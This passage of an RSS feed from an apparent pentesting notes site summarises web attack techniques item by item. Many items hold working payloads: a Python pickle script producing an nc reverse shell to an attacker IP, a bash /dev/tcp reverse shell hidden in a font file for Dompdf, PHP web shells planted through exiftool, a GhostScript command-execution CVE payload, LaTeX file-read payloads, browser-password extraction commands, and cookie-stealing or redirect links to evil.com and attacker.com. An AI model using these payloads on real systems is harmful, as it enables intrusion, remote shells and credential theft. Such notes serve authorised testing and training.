      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</guid>
      <description>Common Directories link /app.py /main.py /modules.py /modules/__init__.py /modules/admin.py SSTI (Server-Side Template Injection) linkSometimes, website may filter specific characters.&#xA;If so, URL encode the payload or convert to HEX.&#xA;In addition, it’s recommended to send requests using Burp Suite because web browsers automatically update the payload.&#xA;First, try below payloads.&#xA;{{ 4*2 }} {{ config.items() }} # Remove curly brackets {2*3} 2*3 RCE linkIf success, we may be able to exploit with OS command injection.</description>
    </item>
    <item>
      <title>SQL Injection with Sqlmap</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</link>
      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</guid>
      <description>Basic Usage link # GET request sqlmap -u &amp;#34;http://&amp;lt;target-ip&amp;gt;/?search=test&amp;#34; Using Burp Suite Request File linkWe can specify a request file which is downloaded from Burp Suite.&#xA;In Burp Suite, right-click on the HTTP request header screen, then click Save Item to download the request file. We can use it with SQLmap. Add the &amp;quot;-r&amp;quot; flag as below.&#xA;sqlmap -r request.txt In addition, we can see payloads to be tested in Burp Suite by setting the Burp proxy IP address to the --proxy flag.</description>
    </item>
    <item>
      <title>Spring Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</link>
      <pubDate>Fri, 15 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</guid>
      <description>Framework Detection linkIf we get the Whitelabel Error Page, the website may use Spring Boot.&#xA;Enumeration linkDirectory Discovery link ffuf -u https://example.com/FUZZ -w seclists/Discovery/Web-Content/spring-boot.txt SSTI linkDiscovery linkIf there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.&#xA;Try them:&#xA;2*2 #{2*2} *{2*2} Then you can also check more about that.</description>
    </item>
    <item>
      <title>Business Logic Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/business-logic-attack/</link>
      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/business-logic-attack/</guid>
      <description>Change Request Params to Unexpected Values link productId=-1 productId=a productId= # empty value productId=1&amp;amp;price=-1000 Exploit Broken Two-Factor linkBrute force a MFA Code link POST /login HTTP/1.1 Cookie: verify=victim ... &amp;lt;!-- Brute force digits code --&amp;gt; mfa-code=1111 Loop Back with 2,147,483,647 linkNo contents yet.&#xA;Register with Too Long-Length Email Address link POST /register HTTP/1.1 ... username=attacker&amp;amp;password=pass1&amp;amp;email=aaaaaaaaaaaaa...aa@vulnerable.com.attacker.com Remove the Specific POST Params link POST /change-password HTTP/1.1 ... &amp;lt;!-- Remove &amp;#39;current-password&amp;#39; parameter --&amp;gt; username=admin&amp;amp;new-password-1=newpass&amp;amp;new-password-2=newpass </description>
    </item>
    <item>
      <title>Dompdf RCE</title>
      <link>https://documentnation.github.io/docs/hdks/web/dompdf-rce/</link>
      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/dompdf-rce/</guid>
      <description>Exploitation link1. Create Malicious Font linkFirst off, we need to prepare the malicious .ttf file.&#xA;Here, we find the .ttf file in our local system and copy it to the current directory and change the extention ttf to php because we want to execute PHP script.&#xA;find / -name &amp;#34;*.ttf&amp;#34; 2&amp;gt;/dev/null cp /path/to/example.ttf ./evil.php Then add the PHP payload at the end of the file.&#xA;... &amp;lt;?php system(&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    <item>
      <title>Redis SSRF</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/redis-ssrf/</link>
      <pubDate>Sat, 09 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/redis-ssrf/</guid>
      <description>Investigation linkIf the target server runs Redis server and the website interacts with the Redis server, we can modify the key value in the Redis and reflects the result through SSRF using gopher.&#xA;url=http://evil.com/ Exploitation linkAutomation linkWe can use Gopherus to create a payload.&#xA;Payload Manually linkTo make the payload for SSRF manually, we need to know what commands to insert.&#xA;To make it clear, try to demonstrate the command (RESP format) to update the target key value in Redis.</description>
    </item>
    <item>
      <title>Broken Link Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/web/broken-link-hijacking/</link>
      <pubDate>Sat, 26 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/broken-link-hijacking/</guid>
      <description>Investigation linkAssume that target website loads external JavaScript file in example.com no longer exists as below.&#xA;&amp;lt;script src=&amp;#34;//example.com/script.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; If attacker bought this domain, he can host arbitrary JavaScript file named script.js in the example.com root directory.&#xA;Exploitation Examples linkAttacker can write arbitrary code for compromising users in script.js as example above.&#xA;For example, if target website includes sensitive information of authenticated user in the page where the broken link is loaded, attackers can send these information to their owned server.</description>
    </item>
    <item>
      <title>File Upload Attack on Exiftool</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-exiftool/</link>
      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-exiftool/</guid>
      <description>Polyglot Attack linkWe might be able to execute remote code by polyglotting the original plain image file.&#xA;At first, create a blank image file as below, but this step may be not required if you already have some image file.&#xA;convert -size 32x32 xc:white test.jpg Then insert OS command with exiftool.&#xA;exiftool -Comment=&amp;#34;&amp;lt;?php system(&amp;#39;ls&amp;#39;); ?&amp;gt;&amp;#34; example.png exiftool -Comment=&amp;#39;&amp;lt;?php echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;; system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#39; exploit.png exiftool -Comment=&amp;#34;&amp;lt;?php echo &amp;#39;START &amp;#39; . file_get_contents(&amp;#39;/etc/passwd&amp;#39;) .</description>
    </item>
    <item>
      <title>File Upload Attack on ImageMagick</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-imagemagick/</link>
      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-imagemagick/</guid>
      <description>This page is no content yet, but please refer to the references below to achieve this attack.</description>
    </item>
    <item>
      <title>IDOR (Insecure Direct Object References) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/idor-attack/</link>
      <pubDate>Tue, 22 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/idor-attack/</guid>
      <description>Find Vulnerabilities from HTML Source Code linkFirst check values of attributes on input elements.&#xA;&amp;lt;input name=&amp;#34;user_id&amp;#34; value=&amp;#34;8&amp;#34; &amp;gt; Then try what will happen when you change the Cookie value in a HTTP header.&#xA;Cookie: user_id=12 Change GET Parameters linkManual link /user?id=1 /user?id=2 /user?id=-1 /user?id=00 /admin/posts/1 /admin/posts/-1 /admin/posts/00 /static/1.txt /static/2.txt /static/-1.txt /static/00.txt Automation link seq 0 100 | ffuf -u https://example.com/user?id=FUZZ -w - wfuzz -z file,./numbers.txt https://example.com/user?id=FUZZ Change POST Parameters link address=1&amp;amp;user_id=1 address=1&amp;amp;user_id=2 # URL Encode &amp;#39;&amp;amp;&amp;#39; address=1%26user_id=2 </description>
    </item>
    <item>
      <title>Client-Side JavaScript Validation Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/client-side-javascript-validation-bypass/</link>
      <pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/client-side-javascript-validation-bypass/</guid>
      <description>Investigation linkFor example, assume that website modifies user input then validation check when logged in as the following JavaScript (e.g. validation.js).&#xA;// validation.js function validate() { let username = document.getElementById(&amp;#34;username&amp;#34;).value; let password = document.getElementById(&amp;#34;password&amp;#34;).value; // Change the username input if it contains &amp;#34;admin&amp;#34; to confuse attackers. username = username.replace(/admin/g, &amp;#34;noob&amp;#34;); // If the input value of the username/password are both &amp;#34;admin&amp;#34;, we can bypass this validation. if (username === &amp;#34;admin&amp;#34; &amp;amp;&amp;amp; password === &amp;#34;admin&amp;#34;) { return true; } return false; } By the way, this example may not exist in real world because it’s too simple.</description>
    </item>
    <item>
      <title>Add Custom HTTP Headers in Burp Suite</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/add-custom-http-headers-in-burp-suite/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/add-custom-http-headers-in-burp-suite/</guid>
      <description>Add Custom HTTP Headers linkIn some cases such as bug bounty programs, it may be convenient to set custom HTTP headers in advance.&#xA;Go to Proxy -&amp;gt; Options tab.&#xA;Scroll down to &amp;ldquo;Match and Replace&amp;rdquo;.&#xA;Click on &amp;ldquo;Add&amp;rdquo;.&#xA;Set rule:&#xA;User Agent&#xA;Type: Request header Match: ^User-Agent.*$ Replace: User-Agent: HackerOne-username Comment: New Original Header&#xA;Type: Request header Match: (empty) Replace: X-Bug-Bounty: HackerOne-username Comment: Check the box of &amp;ldquo;Regex match&amp;rdquo;.&#xA;Click on &amp;ldquo;OK&amp;rdquo;.</description>
    </item>
    <item>
      <title>Automate Sequence Requests with Burp Intruder</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/automate-sequence-requests-with-burp-intruder/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/automate-sequence-requests-with-burp-intruder/</guid>
      <description>Automation link &amp;ldquo;Project options&amp;rdquo; -&amp;gt; &amp;ldquo;Sessions&amp;rdquo; -&amp;gt; &amp;ldquo;Session handling rules&amp;rdquo; panel -&amp;gt; Click &amp;ldquo;Add&amp;rdquo;. The &amp;ldquo;Session handling rules editor&amp;rdquo; opens. &amp;ldquo;Scope&amp;rdquo; tab -&amp;gt; Select &amp;ldquo;Include all URLs&amp;rdquo;. &amp;ldquo;Details&amp;rdquo; tab -&amp;gt; Under &amp;ldquo;Rule actions&amp;rdquo; -&amp;gt; Click &amp;ldquo;Add&amp;rdquo; -&amp;gt; &amp;ldquo;Run a macro&amp;rdquo; -&amp;gt; Under &amp;ldquo;Select macro&amp;rdquo; -&amp;gt; Click &amp;ldquo;Add&amp;rdquo;. The &amp;ldquo;Macro Recorder&amp;rdquo; opens. Select the sequence of requests as follows: POST /message/submit GET /message POST /account Click &amp;ldquo;OK&amp;rdquo;. Manage Parameters link In the list of requests, select the requests in which specific value used POST parameter changes.</description>
    </item>
    <item>
      <title>Integrate Burp Request and SQLmap</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/integrate-burp-request-and-sqlmap/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/integrate-burp-request-and-sqlmap/</guid>
      <description>Download Request File in Burp Suite link Right click on the request field in Burp Suite. Click &amp;ldquo;Save item&amp;rdquo; or &amp;ldquo;Copy to file&amp;rdquo; to download the request state. Save as &amp;ldquo;request.txt&amp;rdquo; (this is arbitrary name). Using Request File in SQLmap linkAfter downloading the request file in Burp Suite as the previous section, we can use when running SQLmap.&#xA;sqlmap -r request.txt By the way, we can see what SQLmap send payloads to websites by adding the --proxy flag.</description>
    </item>
    <item>
      <title>SOCKS Proxy in Burp Suite</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/socks-proxy-in-burp-suite/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/socks-proxy-in-burp-suite/</guid>
      <description>Setup SOCKS Proxy link In Burp Suite, go to Proxy → Proxy settings.&#xA;In the settings window, select User tab and go to Netwotk → Connections in left pane.&#xA;In the SOCKS proxy section, enable &amp;ldquo;Override options for this project only&amp;rdquo;.&#xA;Fill proxy host and port as follow:&#xA;SOCKS proxy host: 127.0.0.1 SOCKS proxy port: 9251 Check &amp;ldquo;Use SOCKS proxy&amp;rdquo; and close the window.</description>
    </item>
    <item>
      <title>Turbo Intruder in Burp Suite</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/turbo-intruder-in-burp-suite/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/turbo-intruder-in-burp-suite/</guid>
      <description>Using Single Parameter linkSet “%s” to the parameter for brute force.&#xA;For example, set %s as the value of password then we can brute force to password.&#xA;POST /login HTTP/1.1 ... username=admin&amp;amp;password=%s Here is the Python cheat sheet. We can use either code depending on the situation.&#xA;def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5, requestsPerConnection=5, pipeline=False ) # Brute force (wordlist) for word in open(&amp;#39;/usr/share/wordlists/rockyou.txt&amp;#39;): engine.queue(target.req, word.rstrip()) # Brute force (0 - 255) for i in range(0, 255): engine.</description>
    </item>
    <item>
      <title>Web Race Condition Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/web-race-condition-attack/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/web-race-condition-attack/</guid>
      <description>Investigation linkIf target website has the functionality that logged-in user can apply the 10% off code for buying products, the code must be applied only one time most of the time. However, this rule might be bypassed by exploiting race condition vulnerability with concurrent requests.&#xA;Race Condition Attack using Turbo Intruder in Burp Suite linkWe can easily achieve race condition attack by using Turbo Intruder.&#xA;In Burp Suite, right-click on specific request.</description>
    </item>
    <item>
      <title>Prototype Pollution in Server-Side</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</link>
      <pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</guid>
      <description>Investigation linkIf the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.&#xA;POST /user/update HTTP/1.1 Host: example.com ... { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__proto__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Other option { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;constructor&amp;#34;: { &amp;#34;prototype&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } } // Bypass sanitization 1 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__pro__proto__to__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Bypass sanitization 2 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.</description>
    </item>
    <item>
      <title>GhostScript Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/ghostscript-pentesting/</link>
      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/ghostscript-pentesting/</guid>
      <description>Arbitrary Command Execution (CVE-2018-16509) Before v9.24 linkReference: https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509&#xA;If target website uses the functionality which allows user to upload image files associated Python&amp;rsquo;s Pillow (PIL), we can execute remote command over GhostScript vulnerability (-dSAFER bypass using OutputFile).&#xA;Create an image file in which contents as below, then upload it. Command will be executed in the target server.&#xA;%!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: -0 -0 100 100 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%touch /tmp/hello.</description>
    </item>
    <item>
      <title>Python Pickle RCE</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/python-pickle-rce/</link>
      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/python-pickle-rce/</guid>
      <description>Exploitation linkBelow is the Python script (mypickle.py) to generate the payload to reverse shell.&#xA;import pickle import base64 import os class RCE: def __reduce__(self): cmd = (&amp;#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc 10.0.0.1 4444 &amp;gt; /tmp/f&amp;#39;) return os.system, (cmd,) if __name__ == &amp;#39;__main__&amp;#39;: pickled = pickle.dumps(RCE()) print(base64.b64encode(pickled)) # or print(base64.urlsafe_b64encode(pickled)) Now run this script to generate the Base64 payload.&#xA;python3 mypickle.py Copy the ourput base64 string and paste it to where the payload affects in website.</description>
    </item>
    <item>
      <title>Ruby on Rails Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/ruby/ruby-on-rails-pentesting/</link>
      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/ruby/ruby-on-rails-pentesting/</guid>
      <description>Common Directories link /assets/application.css /config /Gemfile /Gemfile.lock /rails/info /rails/info/properties /rails/info/routes In addition, it’s worth to fuzz under /rails/ directory as below.&#xA;ffuf -u https://example.com/rails/FUZZ -w wordlist.txt ERB Template Injection linkIf target website uses ERB template which affects a page, we can inject malicious template.&#xA;text = &amp;#34;&amp;lt;%= 2*3 %&amp;gt;&amp;#34; result = ERB.new(text).result(binding) puts result # expected result: 6 Payloads linkReference: Server Side Template Injection&#xA;&amp;lt;%= 2*3 %&amp;gt; &amp;lt;%= self.methods %&amp;gt; &amp;lt;%= self.</description>
    </item>
    <item>
      <title>HTML Smuggling</title>
      <link>https://documentnation.github.io/docs/hdks/web/html-smuggling/</link>
      <pubDate>Wed, 26 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/html-smuggling/</guid>
      <description>Exploitation linkAttackers can use anchor tag to invite victim to download a malicious file as below. When clicking, the malicious file is downloaded as the name “payment.docx”.&#xA;&amp;lt;a href=&amp;#34;/malicious_doc.docx&amp;#34; download=&amp;#34;payment.docx&amp;#34;&amp;gt;Cliek Here&amp;lt;/a&amp;gt; Alternatively, attackers can also use JavaScript, then let browsers to download a malicious file when loading the page, or invite victim to click download button.&#xA;var a = document.createElement(&amp;#39;a&amp;#39;); a.download = &amp;#39;malicious_doc.docx&amp;#39; Using JavaScript Blob linkBy using blob, attackers can let victim to download a malicious file while obfuscate its content by encoding/decoding malicious code.</description>
    </item>
    <item>
      <title>TeamCity Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/teamcity-pentesting/</link>
      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/teamcity-pentesting/</guid>
      <description>Common Directories link /admin /admin/admin.html Interesting Files in Systems link TeamCity/conf/teamcity-startup.propertie .BuildServer/system Find Super User Authentication Tokens linkIf we find a super user authentication token, we can login as super user using the token.&#xA;grep -rni &amp;#39;authentication token&amp;#39; TeamCity/logs grep -rni &amp;#39;Super user authentication token&amp;#39; TeamCity/logs grep -rni &amp;#39;token&amp;#39; TeamCity/logs After retrieving, we can login as administrator by entering the token in the password field and empty the username.&#xA;Arbitrary Command Execution by Custom Script link Login as admin user.</description>
    </item>
    <item>
      <title>WAF (Web Application Firewall) Detection</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/waf-detection/</link>
      <pubDate>Fri, 14 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/waf-detection/</guid>
      <description>Automation link nmap --script=http-waf-fingerprint example.com wafw00f https://example.com </description>
    </item>
    <item>
      <title>Angular Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</link>
      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</guid>
      <description>HTML Attributes linkIf a website uses AngularJS framework, the nodes have a “ng-apps” attribute. So you can check it in a HTML source code.&#xA;&amp;lt;div ng-apps&amp;gt; Server-Side Template Injection (SSTI) link {{2*3}} {{$on.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} {{constructor.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} &amp;lt;input ng-focus=$event.view.alert(&amp;#39;test&amp;#39;)&amp;gt; &amp;lt;div ng-app ng-csp&amp;gt;&amp;lt;textarea autofocus ng-focus=&amp;#34;d=$event.view.document;d.location.hash.match(&amp;#39;x1&amp;#39;) ? &amp;#39;&amp;#39; : d.location=&amp;#39;//localhost/mH/&amp;#39;&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/div&amp;gt; It worth testing to bypass sanitizing as below.&#xA;# Remove one-pair braces {2*3} # Remove all braces 2*3 # Add additional braces {{{2*3}}} </description>
    </item>
    <item>
      <title>Dump Git Repository from Website</title>
      <link>https://documentnation.github.io/docs/hdks/web/dump-git-repository-from-website/</link>
      <pubDate>Thu, 06 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/dump-git-repository-from-website/</guid>
      <description>Dumping linkWe can simply use wget command in Linux to download the git repository.&#xA;After that, we can investigate files or all histories.&#xA;# -r: Recursive wget -r https://example.com/.git/ cd example.com git log --stat git checkout &amp;lt;commit_id&amp;gt; Dumping with gitdumper and extracter linkGitTools downloads Git repository of the web application.&#xA;To dump the repository, execute the following commands.&#xA;wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh chmod &amp;#43;x gitdumper.sh ./gitdumper.sh https://example.com/.git/ ./example We should get the git repository in local.</description>
    </item>
    <item>
      <title>Gitea Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/version-control/git/gitea-pentesting/</link>
      <pubDate>Thu, 06 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gitea-pentesting/</guid>
      <description>Common Directories link /api/swagger /api/v1/repos/search?q=test /api/v1/users/search?q=test /api/v1/users/&amp;lt;username&amp;gt;/repos /explore/organizations /explore/repos /explore/users # OAuth /.well-known/openid-configuration /login/oauth/authorize /login/oauth/access_token /login/oauth/userinfo /login/oauth/keys Investigation linkRepositories linkIf we can access to repositories, we might be able to find sensitive information e.g. credentials, subdomains, other domains, secret keys, etc.&#xA;So check the source code.&#xA;Get Secrets in Web Hooks linkIn the existing repository, we may find the secret value in the repository → Settings → Web Hooks.&#xA;Find User Credentials linkIf we have access to the target system and the repository, that is pushed in Gitea, exists in the system, we might be able to find the credential.</description>
    </item>
    <item>
      <title>Prototype Pollution in Client-Side</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/</link>
      <pubDate>Mon, 03 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/</guid>
      <description>Investigation linkCheck if we can assign arbitrary property via URL.&#xA;Try various ways.&#xA;https://example.com/?__proto__[foo]=bar https://example.com/?__proto__.foo=bar https://example.com/?constructor.[prototype][foo]=bar https://example.com/?constructor.prototype.foo=bar # Bypass sanitization https://example.com/?__pro__proto__to__[foo]=bar https://example.com/?__pro__proto__to__.foo=bar https://example.com/?constconstructorructor[prototype][foo]=bar https://example.com/?constconstructorructor.prototype.foo=bar https://example.com/?constconstructorructor[protoprototypetype][foo]=bar https://example.com/?constconstructorructor.protoprototypetype.foo=bar Open browser console, and type the following to check if our above property is assigned.&#xA;Object.prototype.foo constructor.prototype.foo // the expected output: &amp;#34;bar&amp;#34; DOM XSS linkIf our payload affects an HTML element after loading, we can inject DOM-based XSS as below.&#xA;Assume the key name of the property is &amp;ldquo;source_url&amp;rdquo;, whose value is loaded as &amp;ldquo;src&amp;rdquo; in a script element.</description>
    </item>
    <item>
      <title>SQL Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</guid>
      <description>Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,&#xA;URL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.</description>
    </item>
    <item>
      <title>Extract Web Browser Passwords</title>
      <link>https://documentnation.github.io/docs/hdks/web/extract-web-browser-passwords/</link>
      <pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/extract-web-browser-passwords/</guid>
      <description>Firefox link wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py python3 firefox_decrypt.py Google Chrome link wget https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py python3 decrypt_chrome_password.py </description>
    </item>
    <item>
      <title>Bookmarklet Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/bookmarklet-attack/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/bookmarklet-attack/</guid>
      <description>Exploitation linkMalicious Links linkAttackers induce victims to add their malicious link into the bookmark menu as below.&#xA;&amp;lt;p&amp;gt;Drag and drop the following link into the bookmark menu to access easily!&amp;lt;/p&amp;gt; &amp;lt;a href=&amp;#34;javascript:window.location=&amp;#39;https://evil.com/&amp;#39;&amp;#34;&amp;gt;Example.com&amp;lt;/a&amp;gt; In addition, if the current website does not set HttpOnly flag on the Set-Cookie response header, attackers can get the victim&amp;rsquo;s cookie and send it to the malicious website as below.&#xA;&amp;lt;p&amp;gt;Drag and drop me the following link into the bookmark menu to access easily!</description>
    </item>
    <item>
      <title>LaTeX Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/</guid>
      <description>Payloads - Read Files link # Read file \input{/etc/passwd} $\input{/etc/passwd}$ $$\input{/etc/passwd}$$ \include{example} # Read example.tex $\include{example}$ $$\include{example}$$ \lstinputlisting{/etc/passwd} $\lstinputlisting{/etc/passwd}$ $$\lstinputlisting{/etc/passwd}$$ Payloads - Write File link \newwrite\outfile $\newwrite\outfile$ $$\newwrite\outfile$$ \openout\outfile=cmd.tex $\openout\outfile=cmd.tex$ $$\openout\outfile=cmd.tex$$ \write\outfile{Hello-World} $\write\outfile{Hello-World}$ $$\write\outfile{Hello-World}$$ </description>
    </item>
    <item>
      <title>DOM Cloberring</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/dom-cloberring/</link>
      <pubDate>Thu, 15 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/dom-cloberring/</guid>
      <description>Basic Exploitation linkIf the website adds the JavaScript code into the DOM when loading page as below,&#xA;window.onload = function() { let someObj = window.someObj || {}; let script = document.createElement(&amp;#39;script&amp;#39;); script.src = someObj.url; document.body.appendChild(script); } We may manipulate this someObj and override the properties (url here) using anchor elements, then we can execute arbitrary JavaScript code.&#xA;For example, insert the following code in the comment, search, etc. in the target website.</description>
    </item>
    <item>
      <title>Open Redirect</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/open-redirect/</link>
      <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/open-redirect/</guid>
      <description>Payloads link https://vulnerable.com/example.php?redirectUrl=https://attacker.com/ https://vulnerable.com/example.php?redirectUrl=https:\\attacker.com\ https://vulnerable.com/example.php?redirectUrl=https://attacker.com#.vulnerable.com/ &amp;lt;!-- &amp;#34;%E3%80%82&amp;#34; is &amp;#34;.&amp;#34; --&amp;gt; https://vulnerable.com/example.php?redirectUrl=https://attacker.com%E3%80%82%23.vulnerable.com/ &amp;lt;!-- &amp;#34;%0d&amp;#34; is newline --&amp;gt; https://vulnerable.com/example.php?redirectUrl=/%0d/attacker.com/ Unrestricted QR Code Scanning linkReference: https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f&#xA;If website (or mobile application) has the function for scanning QR code but not restricts URL, we can let it to read malicious QR code.&#xA;1. Generate QR Code linkFirst, we need to create a malicious QR code. There are many online tools for generating it.&#xA;2. Read Malicious QR Code in the Application linkAfter generating the QR code, read the QR code in the target application.</description>
    </item>
    <item>
      <title>Host Header Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/host-header-attack/</link>
      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/host-header-attack/</guid>
